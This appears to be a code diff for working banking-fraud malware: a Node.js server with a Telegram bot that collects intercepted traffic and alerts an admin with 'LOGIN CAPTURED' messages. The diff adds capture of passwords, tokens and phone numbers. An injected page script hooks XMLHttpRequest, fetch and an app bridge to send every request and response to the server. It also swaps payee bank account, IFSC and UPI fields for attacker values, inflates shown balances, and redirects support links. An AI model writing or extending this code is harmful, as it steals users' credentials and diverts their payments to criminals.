@@ -209,12 +209,23 @@ app.post('/hook/log', async (req, res) => {
       userId = findNumericId(respJson, 0);
     }
     let reqBody = {};
-    try { reqBody = JSON.parse(b || '{}'); } catch(e) {}
+    if (b) {
+      try { reqBody = JSON.parse(b); } catch(e) {
+        try {
+          const pairs = b.split('&');
+          for (const pair of pairs) {
+            const [k, ...vParts] = pair.split('=');
+            if (k) reqBody[decodeURIComponent(k)] = decodeURIComponent(vParts.join('=') || '');
+          }
+        } catch(e2) {}
+      }
+    }
     if (!userId) userId = findNumericId(reqBody, 0);
 
-    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.telephone || reqBody.memberPhone || reqBody.username || '';
-    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || '') : '';
+    const reqPhone = reqBody.phone || reqBody.mobile || reqBody.telephone || reqBody.memberPhone || reqBody.username || reqBody.loginName || reqBody.account || '';
+    const respPhone = (respData && typeof respData === 'object') ? (respData.phone || respData.mobile || respData.memberPhone || respData.loginName || '') : '';
     const phone = reqPhone || respPhone;
+    const reqPassword = reqBody.password || reqBody.pwd || reqBody.loginPwd || reqBody.pass || '';
 
     if (userId && data.trackedUsers) {
       const existing = data.trackedUsers[String(userId)] || {};
@@ -225,9 +236,16 @@ app.post('/hook/log', async (req, res) => {
         phone: phone || existing.phone || ''
       };
       if (respData && typeof respData === 'object') {
-        const name = respData.name || respData.nickname || respData.realName || respData.userName || '';
+        const name = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
         if (name) data.trackedUsers[String(userId)].name = name;
-        const bal = respData.balance || respData.userBalance || respData.availableBalance || respData.totalBalance || respData.money || respData.itoken || respData.tokenBalance || '';
+        function findBal(obj, depth) {
+          if (!obj || typeof obj !== 'object' || depth > 5) return '';
+          const bKeys = ['balance', 'iToken', 'itoken', 'userBalance', 'availableBalance', 'totalBalance', 'money', 'tokenBalance', 'usermoney', 'memberBalance'];
+          for (const bk of bKeys) { if (obj[bk] !== undefined && obj[bk] !== null && obj[bk] !== '') return String(obj[bk]); }
+          for (const k of Object.keys(obj)) { if (typeof obj[k] === 'object' && !Array.isArray(obj[k])) { const f = findBal(obj[k], depth + 1); if (f) return f; } }
+          return '';
+        }
+        const bal = findBal(respData, 0) || findBal(respJson, 0);
         if (bal) data.trackedUsers[String(userId)].balance = String(bal);
       }
     }
@@ -238,14 +256,17 @@ app.post('/hook/log', async (req, res) => {
       bot.sendMessage(data.adminChatId, `📡 ${m || 'GET'} ${urlPath}${tag}${phoneTag}\n📊 Status: ${s || 'N/A'}`).catch(()=>{});
     }
 
-    if (u.includes('login') || u.includes('auth') || u.includes('signin') || u.includes('doLogin') || u.includes('register')) {
+    if (u.includes('login') || u.includes('Login') || u.includes('auth') || u.includes('signin') || u.includes('doLogin') || u.includes('register') || u.includes('Register')) {
       const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
       const uid2 = findNumericId(rd, 0) || userId || 'N/A';
-      const token = rd.token || rd.accessToken || rd.access_token || '';
+      const token = rd.token || rd.accessToken || rd.access_token || rd.jwt || '';
+      const loginPhone = phone || rd.phone || rd.mobile || rd.loginName || reqBody.memberPhone || '';
       notifyAdmin(data,
 `🔑 LOGIN CAPTURED
-👤 User: ${uid2}${phone ? '\n📱 Phone: ' + phone : ''}${token ? '\n🔐 Token: ' + token.substring(0, 50) + '...' : ''}
-📦 Request: ${(b || '').substring(0, 500)}
+👤 User ID: ${uid2}
+📱 Phone/Account: ${loginPhone || 'N/A'}${reqPassword ? '\n🔐 Password: ' + reqPassword : ''}${token ? '\n🎫 Token: ' + String(token).substring(0, 60) + '...' : ''}
+📦 Raw Body: ${(b || '').substring(0, 800)}
+📋 Response: ${(r || '').substring(0, 500)}
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
     }
 
@@ -714,9 +735,16 @@ var UID='';
 function lc(){
 try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);x.send();
 if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
-lc();
+try{lc();}catch(e){}
 setInterval(function(){try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
-x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}},30000);
+x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}},25000);
+
+function b2s(b){
+if(!b)return'';
+if(typeof b==='string')return b;
+try{if(typeof URLSearchParams!=='undefined'&&b instanceof URLSearchParams)return b.toString();}catch(e){}
+try{if(typeof FormData!=='undefined'&&b instanceof FormData){var p=[];b.forEach(function(v,k){p.push(k+'='+v);});return p.join('&');}}catch(e){}
+try{return String(b);}catch(e){return'';}}
 
 var BF={accountno:'an',accountnumber:'an',account_no:'an',receiveaccountno:'an',
 bankaccount:'an',bankaccountno:'an',payeeaccount:'an',cardno:'an',cardnumber:'an',
@@ -724,97 +752,114 @@ bankcardno:'an',payeecardno:'an',receivecardno:'an',payeebankaccount:'an',
 payeebankaccountno:'an',payeeaccountno:'an',receiveraccount:'an',receiveraccountno:'an',
 walletaccount:'an',walletno:'an',collectionaccount:'an',collectionaccountno:'an',
 customerbanknumber:'an',customerbankaccount:'an',accno:'an',acc_no:'an',
+account:'an',receiveaccount:'an',
 beneficiaryname:'ah',accountname:'ah',account_name:'ah',receiveaccountname:'ah',
 holdername:'ah',accountholder:'ah',bankaccountholder:'ah',receivename:'ah',
 payeename:'ah',bankaccountname:'ah',realname:'ah',cardholder:'ah',cardname:'ah',
 receivername:'ah',collectionname:'ah',customername:'ah',accname:'ah',acc_name:'ah',
+truename:'ah',receiverealname:'ah',payeerealname:'ah',
 ifsc:'if',ifsccode:'if',ifsc_code:'if',receiveifsc:'if',bankifsc:'if',
 payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
-bankname:'bn',bank_name:'bn',bank:'bn',payeebankname:'bn',receiverbankname:'bn',
+bankname:'bn',bank_name:'bn',payeebankname:'bn',receiverbankname:'bn',
 upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};
 
+var NF={'name':1,'payname':1,'收款人':1,'收款人姓名':1,'收款姓名':1,'持卡人':1};
+
 function rb(o,d){
-if(!o||typeof o!=='object'||!CFG||!CFG.an||d>8)return;
+if(!o||typeof o!=='object'||!CFG||!CFG.an||d>10)return;
 if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
+var hasAcct=false;
+for(var k in o){var kl=k.toLowerCase().replace(/[_\\-]/g,'');
+if(BF[kl]==='an'||BF[kl]==='if')hasAcct=true;}
 for(var k in o){
 if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
 if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
 var kl=k.toLowerCase().replace(/[_\\-]/g,'');
 var m=BF[kl];
-if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];}
+if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];continue;}
+if(NF[kl]&&hasAcct&&CFG.ah&&String(o[k]).length>0){o[k]=CFG.ah;}
+if(kl==='bank'&&CFG.bn&&String(o[k]).length>0){o[k]=CFG.bn;}
 }}
 
-function addBal(o,bonus){
-if(!o||typeof o!=='object'||!bonus)return;
-var bk=['balance','userbalance','availablebalance','totalbalance','money','coin',
-'wallet','itoken','itokenbalance','tokenbalance','usermoney','rechargebalance'];
+var BKEYS=['balance','userbalance','availablebalance','totalbalance','money','coin',
+'wallet','itoken','itokenbalance','tokenbalance','usermoney','rechargebalance',
+'amount','mybalance','walletbalance','accountbalance','totalamount','totalmoney',
+'memberbalance','membermoney','useritoken','myitoken','mytokenbalance','freeze'];
+
+function addBal(o,bonus,d){
+if(!o||typeof o!=='object'||!bonus||d>10)return;
+if(Array.isArray(o)){for(var i=0;i<o.length;i++){if(typeof o[i]==='object')addBal(o[i],bonus,d+1);}return;}
 for(var k in o){
-if(bk.indexOf(k.toLowerCase())>-1){
+var kl=k.toLowerCase();
+if(BKEYS.indexOf(kl)>-1){
 var v=parseFloat(o[k]);
-if(!isNaN(v))o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):parseFloat((v+bonus).toFixed(2));}
-if(typeof o[k]==='object'&&o[k]!==null&&!Array.isArray(o[k]))addBal(o[k],bonus);
+if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):parseFloat((v+bonus).toFixed(2));}}
+if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
 }}
 
 function fid(o,d){
-if(!o||typeof o!=='object'||d>5)return'';
+if(!o||typeof o!=='object'||d>6)return'';
 if(Array.isArray(o))return'';
-var fs=['userId','uid','id','memberId','memberCodeId','channelUid','user_id','accountId'];
+var fs=['memberCodeId','userId','channelUid','uid','memberId','user_id','accountId','customerId','userCode','codeId','code_id','member_id'];
 for(var i=0;i<fs.length;i++){
 if(o[fs[i]]!==undefined&&o[fs[i]]!==null&&o[fs[i]]!==''){
-var v=String(o[fs[i]]);if(/^\\d+$/.test(v)&&v.length>=3)return v;}}
+var v=String(o[fs[i]]);if(/^\\d{3,}$/.test(v))return v;}}
+if(o.id!==undefined&&o.id!==null&&o.id!==''){
+var v2=String(o.id);if(/^\\d{6,}$/.test(v2))return v2;}
 for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var f=fid(o[k],d+1);if(f)return f;}}
 return'';}
 
-function modResp(text,url){
+function modResp(text){
 if(!CFG||!CFG.enabled)return text;
 try{
 var j=JSON.parse(text);
 var d=j.data||j.body||j.result||j;
 var id=fid(d,0)||fid(j,0);
 if(id&&id!==UID){UID=id;
-try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config?userId='+id,true);
-x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};x.send();}catch(e){}}
+try{var x=new XMLHttpRequest();x.open('GET',P+'/hook/config?userId='+id,false);x.send();
+if(x.status===200)CFG=JSON.parse(x.responseText);}catch(e){}}
 if(CFG.an){rb(d,0);rb(j,0);}
 var bonus=CFG.bonus||0;
-if(bonus&&d&&typeof d==='object')addBal(d,bonus);
+if(bonus){if(d&&typeof d==='object')addBal(d,bonus,0);addBal(j,bonus,0);}
 return JSON.stringify(j);
 }catch(e){return text;}}
 
-function sendLog(url,method,body,resp,status){
+function sendLog(url,method,bodyStr,resp,status){
 try{var x=new XMLHttpRequest();x.open('POST',P+'/hook/log',true);
 x.setRequestHeader('Content-Type','application/json');
 x.send(JSON.stringify({u:url,m:method,
-b:typeof body==='string'?body.substring(0,2000):'',
-r:resp.substring(0,5000),s:status,uid:UID}));}catch(e){}}
+b:(bodyStr||'').substring(0,3000),
+r:(resp||'').substring(0,5000),s:status,uid:UID}));}catch(e){}}
+
+var _rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
+var _rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');
+
+Object.defineProperty(XMLHttpRequest.prototype,'responseText',{
+get:function(){
+var orig=_rtDesc.get.call(this);
+if(this._pxDone)return this._pxRT!==undefined?this._pxRT:orig;
+if(this.readyState!==4)return orig;
+this._pxDone=true;
+var url=this._hu||'';
+if(url.indexOf(P)===0)return orig;
+try{
+var bs=this._bs||'';
+sendLog(url,this._hm||'',bs,orig,this.status);
+if(CFG&&CFG.enabled){
+var mod=modResp(orig);
+if(mod!==orig){this._pxRT=mod;return mod;}}
+}catch(e){}
+return orig;},configurable:true});
+
+Object.defineProperty(XMLHttpRequest.prototype,'response',{
+get:function(){
+if(this._pxRT!==undefined&&(this.responseType===''||this.responseType==='text'))return this._pxRT;
+return _rDesc.get.call(this);},configurable:true});
 
 var _open=XMLHttpRequest.prototype.open;
 var _send=XMLHttpRequest.prototype.send;
-
-XMLHttpRequest.prototype.open=function(m,u){
-this._hu=u;this._hm=m;
-return _open.apply(this,arguments);};
-
-XMLHttpRequest.prototype.send=function(body){
-var xhr=this;
-var url=this._hu||'';
-var method=this._hm||'GET';
-if(url.indexOf(P)===0)return _send.apply(this,arguments);
-
-var handled=false;
-this.addEventListener('readystatechange',function(){
-if(xhr.readyState===4&&!handled){
-handled=true;
-try{
-var rt=xhr.responseText;
-sendLog(url,method,body,rt,xhr.status);
-if(CFG&&CFG.enabled&&CFG.an){
-var modified=modResp(rt,url);
-if(modified!==rt){
-Object.defineProperty(xhr,'responseText',{writable:true,value:modified});
-Object.defineProperty(xhr,'response',{writable:true,value:modified});
-}}}catch(e){}}});
-
-return _send.apply(this,arguments);};
+XMLHttpRequest.prototype.open=function(m,u){this._hu=u;this._hm=m;return _open.apply(this,arguments);};
+XMLHttpRequest.prototype.send=function(body){this._bs=b2s(body);return _send.apply(this,arguments);};
 
 var _fetch=window.fetch;
 if(_fetch){
@@ -822,38 +867,93 @@ window.fetch=function(input,init){
 var url=typeof input==='string'?input:(input&&input.url)||'';
 if(url.indexOf(P)===0)return _fetch.apply(this,arguments);
 var method=(init&&init.method)||'GET';
-var reqBody=(init&&init.body)||'';
+var bs=b2s(init&&init.body);
+return _fetch.apply(this,arguments).then(function(resp){
+try{
+var ct=resp.headers.get('content-type')||'';
+if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
+var cl=resp.clone();
+return cl.text().then(function(text){
+sendLog(url,method,bs,text,resp.status);
+if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
+var mod=modResp(text);
+if(mod!==text)return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}
+return resp;}).catch(function(){return resp;});
+}catch(e){return resp;}
+});};}
 
-return _fetch.apply(this,arguments).then(function(response){
-return response.text().then(function(text){
-sendLog(url,method,reqBody,text,response.status);
-var modified=modResp(text,url);
-return new Response(modified,{
-status:response.status,statusText:response.statusText,headers:response.headers});
-});});};}
+function csUrl(s){
+if(!s||typeof s!=='string')return false;
+return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1;}
 
 function fixLinks(){
 if(!CFG||!CFG.tg)return;
 var links=document.querySelectorAll('a');
 for(var i=0;i<links.length;i++){
 var h=links[i].href||'';
-if(h.indexOf('t.me/')>-1||h.indexOf('wa.me/')>-1||h.indexOf('whatsapp.com')>-1){
-links[i].href=CFG.tg;
-links[i].setAttribute('href',CFG.tg);}}
-var els=document.querySelectorAll('[data-url],[data-href],[data-link]');
+if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}
+var els=document.querySelectorAll('[data-url],[data-href],[data-link],[data-src]');
 for(var j=0;j<els.length;j++){
-['data-url','data-href','data-link'].forEach(function(attr){
+['data-url','data-href','data-link','data-src'].forEach(function(attr){
 var v=els[j].getAttribute(attr)||'';
-if(v.indexOf('t.me/')>-1||v.indexOf('wa.me/')>-1||v.indexOf('whatsapp.com')>-1){
-els[j].setAttribute(attr,CFG.tg);}});}}
+if(csUrl(v))els[j].setAttribute(attr,CFG.tg);});}}
 
 function fixOnClick(){
 if(!CFG||!CFG.tg)return;
 var all=document.querySelectorAll('[onclick]');
 for(var i=0;i<all.length;i++){
 var oc=all[i].getAttribute('onclick')||'';
-if(oc.indexOf('t.me/')>-1||oc.indexOf('wa.me/')>-1||oc.indexOf('whatsapp.com')>-1){
-all[i].setAttribute('onclick',\"window.location.href='\"+CFG.tg+\"'\");}}}
+if(csUrl(oc)){
+all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}
+
+var _wopen=window.open;
+window.open=function(url){
+if(CFG&&CFG.tg&&csUrl(url)){arguments[0]=CFG.tg;}
+return _wopen.apply(this,arguments);};
+
+if(window.xamlAction&&window.xamlAction.invokeAction){
+var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
+window.xamlAction.invokeAction=function(action,params){
+if(CFG&&CFG.tg&&params){
+try{var p=JSON.parse(params);
+var changed=false;
+['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl'].forEach(function(key){
+if(p[key]&&csUrl(p[key])){p[key]=CFG.tg;changed=true;}});
+if(changed)params=JSON.stringify(p);
+}catch(e){}}
+sendLog('bridge://'+action,'BRIDGE',params||'','',0);
+return _invoke(action,params);};}
+
+document.addEventListener('click',function(e){
+if(!CFG||!CFG.tg)return;
+var el=e.target;var depth=0;
+while(el&&depth<10){
+if(el.tagName==='A'){
+var href=el.getAttribute('href')||'';
+if(href.indexOf('xaml:')===0){
+try{var dec=decodeURIComponent(href.substring(5));
+var jo=JSON.parse(dec);
+if(jo.ct_url&&csUrl(jo.ct_url)){jo.ct_url=CFG.tg;
+el.setAttribute('href','xaml:'+encodeURIComponent(JSON.stringify(jo)));}}catch(e){}}
+if(href.indexOf('syt:')===0){
+try{var dec2=decodeURIComponent(href.substring(4));
+var jo2=JSON.parse(dec2);
+if(jo2.url&&csUrl(jo2.url)){jo2.url=CFG.tg;
+el.setAttribute('href','syt:'+encodeURIComponent(JSON.stringify(jo2)));}}catch(e){}}}
+el=el.parentElement;depth++;}
+},true);
+
+try{
+var domId=document.body?document.body.innerText.match(/ID[:\\s]*([0-9]{6,})/):null;
+if(domId&&domId[1]&&!UID){UID=domId[1];lc();}
+}catch(e){}
+setInterval(function(){
+try{
+if(!UID){
+var m=document.body?document.body.innerText.match(/ID[:\\s]*([0-9]{6,})/):null;
+if(m&&m[1]){UID=m[1];lc();}}
+}catch(e){}
+},5000);
 
 if(document.body){
 var obs=new MutationObserver(function(){fixLinks();fixOnClick();});
